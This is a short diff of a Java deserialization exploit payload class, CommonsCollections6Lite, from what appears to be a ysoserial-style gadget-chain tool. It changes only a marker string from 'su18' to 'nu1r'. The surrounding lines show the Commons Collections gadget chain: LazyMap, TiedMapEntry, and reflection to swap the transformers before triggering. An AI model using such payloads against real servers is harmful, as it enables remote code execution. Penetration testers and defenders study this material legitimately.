@@ -31,10 +31,10 @@ public class CommonsCollections6Lite implements ObjectPayload<Object> {
         Transformer   transformerChain = new ChainedTransformer(fakeTransformers);
         Map           innerMap         = new HashMap();
         Map           outerMap         = LazyMap.decorate(innerMap, transformerChain);
-        TiedMapEntry  tme              = new TiedMapEntry(outerMap, "su18");
+        TiedMapEntry  tme              = new TiedMapEntry(outerMap, "nu1r");
         Map           expMap           = new HashMap();
-        expMap.put(tme, "su18");
-        outerMap.remove("su18");
+        expMap.put(tme, "nu1r");
+        outerMap.remove("nu1r");
 
         Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
         return expMap;
